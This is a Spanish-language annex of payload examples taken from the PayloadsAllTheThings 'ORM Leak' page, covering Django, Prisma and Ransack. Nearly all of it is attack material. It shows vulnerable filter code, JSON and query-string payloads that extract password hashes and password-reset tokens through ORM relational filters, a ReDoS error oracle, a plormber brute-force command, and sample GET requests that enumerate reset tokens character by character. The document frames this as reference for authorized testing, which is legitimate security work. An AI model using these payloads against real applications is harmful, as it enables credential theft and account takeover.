# Exposición excesiva de datos en API: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [ORM Leak/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/ORM%20Leak/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. ORM Leak / Django (Python)

```py
users = User.objects.filter(**request.data)
serializer = UserSerializer(users, many=True)
```

### Variantes presentes en tablas o texto del apartado

```text
**
```

## 2. Django (Python) / Consulta filter

```json
{
  "username": "admin",
  "password__startswith": "p"
}
```

### Variantes presentes en tablas o texto del apartado

```text
__startswith
__contains
__regex
```

## 3. Relational Filtering / One-to-One

```json
{
  "created_by__user__password__contains": "p"
}
```

## 4. Relational Filtering / Many-to-Many

```json
{
  "created_by__departments__employees__user__username__startswith": "p",
  "created_by__departments__employees__user__id": 1
}
```

### Variantes presentes en tablas o texto del apartado

```text
created_by__departments__employees__user__id
created_by__departments__employees__user__username
created_by__departments__employees__user__password
```

## 5. Django (Python) / Error-based leaking - ReDOS

```json
{"created_by__user__password__regex": "^(?=^pbkdf1).*.*.*.*.*.*.*.*!!!!$"}
// => Return something

{"created_by__user__password__regex": "^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$"}  
// => Error 500 (Timeout exceeded in regular expression match)
```

## 6. ORM Leak / Prisma (Node.JS)

```ps1
    plormber prisma-contains \
        --chars '0123456789abcdef' \
        --base-query-json '{"query": {PAYLOAD}}' \
        --leak-query-json '{"createdBy": {"resetToken": {"startsWith": "{ORM_LEAK}"}}}' \
        --contains-payload-json '{"body": {"contains": "{RANDOM_STRING}"}}' \
        --verbose-stats \
        https://some.vuln.app/articles/time-based;
```

```js
const posts = await prisma.article.findMany({
  where: req.query.filter as any // Vulnerable to ORM Leaks
})
```

```json
{
  "filter": {
    "include": {
      "createdBy": true
    }
  }
}
```

```json
{
  "filter": {
    "select": {
      "createdBy": {
        "select": {
          "password": true
        }
      }
    }
  }
}
```

## 7. Relational Filtering / One-to-One

### Variantes presentes en tablas o texto del apartado

```text
filter[createdBy][resetToken][startsWith]=06
```

## 8. Relational Filtering / Many-to-Many

```json
{
  "query": {
    "createdBy": {
      "departments": {
        "some": {
          "employees": {
            "some": {
              "departments": {
                "some": {
                  "employees": {
                    "some": {
                      "departments": {
                        "some": {
                          "employees": {
                            "some": {
                              "{fieldToLeak}": {
                                "startsWith": "{testStartsWith}"
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

## 9. ORM Leak / Ransack (Ruby)

```ps1
    GET /posts?q[user_reset_password_token_start]=0 -> Empty results page
    GET /posts?q[user_reset_password_token_start]=1 -> Empty results page
    GET /posts?q[user_reset_password_token_start]=2 -> Results in page

    GET /posts?q[user_reset_password_token_start]=2c -> Empty results page
    GET /posts?q[user_reset_password_token_start]=2f -> Results in page
```

```ps1
    GET /labs?q[creator_roles_name_cont]=​superadmin​​&q[creator_recoveries_key_start]=0
```

### Variantes presentes en tablas o texto del apartado

```text
4.0.0
reset_password_token
recoveries_key
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
